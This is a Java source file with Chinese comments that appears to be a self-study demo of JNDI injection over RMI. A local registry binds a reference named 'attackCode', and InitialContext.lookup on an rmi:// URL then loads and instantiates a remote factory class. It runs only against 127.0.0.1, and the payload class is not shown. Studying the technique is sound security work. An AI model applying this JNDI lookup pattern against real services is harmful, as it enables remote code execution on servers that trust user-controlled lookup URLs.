package com.tansun.attack;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;
import javax.naming.Reference;
import java.net.MalformedURLException;
import java.rmi.*;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * JNDI攻击
 * https://blog.csdn.net/qq_33020901/article/details/98472921
 * 利用RMI（远程方法调用）
 *
 *  JNDI (Java Naming and Directory Interface) 是一组应用程序接口，
 *  它为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定位用户、
 *  网络、机器、对象和服务等各种资源。比如可以利用JNDI在局域网上定位一台打印机，
 *  也可以用JNDI来定位数据库服务或一个远程Java对象。JNDI底层支持RMI远程对象，
 *  RMI注册的服务可以通过JNDI接口来访问和调用。
 *
 *  InitialContext 是一个实现了 Context接口的类。使用这个类作为JNDI命名服务的入口点
 *
 *  JNDI查找远程对象时InitialContext.lookup(URL)的参数URL可以覆盖一些上下文中的属性，
 *  比如：Context.PROVIDER_URL。
 *
 */
public class JNDIAttackClient {

    public static void main(String[] args) throws RemoteException, AlreadyBoundException, MalformedURLException, NotBoundException, NamingException {

//        JndiTest1();

//        JndiTest2();

        JndiAttackExpolit();

    }

    private static void JndiAttackExpolit() throws RemoteException, NamingException, AlreadyBoundException, MalformedURLException, NotBoundException {
        RMIRegistryServer rmiRegistryServer = new RMIRegistryServer();
        rmiRegistryServer.bindBadCoed();

        Context context = new InitialContext();
        // 会动态加载并实例化Factory类,接着调用factory.getObjectInstance()获取外部远程对象实例；
        context.lookup("rmi://127.0.0.1:1099/attackCode");

    }

    private static void JndiTest2() throws NamingException, MalformedURLException, RemoteException, AlreadyBoundException {
        RMIRegistryServer rmiRegistryServer = new RMIRegistryServer();
        Context context = rmiRegistryServer.rmiRegistryTable();

        // lookup方法查找的是 远程注册对象的接口，所以该接口必须 extends Remote接口
        // JNDI URL注入攻击，URI为用户可控
        IHello rhello = (IHello) context.lookup("rmi://127.0.0.1:8080/test");
        rhello.sayHello("sayHello");
    }

    private static void JndiTest1() throws RemoteException, AlreadyBoundException, MalformedURLException, NotBoundException {
        RMIRegistryServer rmiRegistryServer = new RMIRegistryServer();
        rmiRegistryServer.registryObj();

        Registry registry = LocateRegistry.getRegistry("127.0.0.1",1099);
        // 查询远程对象服务名称,获取远程服务代理对象
        IHello rhello = (IHello) registry.lookup("hello");
        rhello.sayHello("testHello");
    }
}
